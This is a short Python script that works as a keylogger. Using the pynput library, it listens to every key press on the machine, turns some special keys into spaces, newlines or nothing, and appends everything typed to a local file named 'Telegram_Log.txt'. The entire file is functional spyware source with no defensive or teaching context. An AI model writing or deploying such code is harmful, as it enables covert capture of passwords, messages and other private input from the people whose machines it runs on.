from pynput.keyboard import Listener
def Key_Logger(key):
    key=str(key).replace("'", "")
    if key=='Key.space':key=' '
    elif key=='Key.backspace':key=''
    elif key=='key.shift_r':key=''
    elif key=='shift':key=''
    elif key=='Key.enter':key='\n'
    #elif key=='Key.ctrl_r':key=' Ctrl_r'
    #elif key=='Key.ctrl':key=' ctrl'
    #elif key=='Key.tab':key=' Tab'
    #elif key=='Key.caps_lock':key=' Caps_Lock'
    #elif key=='Key.alt':key=' alt'
    #elif key=='Key.up':key='       up'
    #elif key=='Key.down':key='     down'
    #elif key=='Key.right':key='   right'
    #elif key=='Key.left':key='    left'
    with open('Telegram_Log.txt', 'a') as log:
        log.write(key)
with Listener(on_press=Key_Logger) as KeyStrokes:
	KeyStrokes.join()
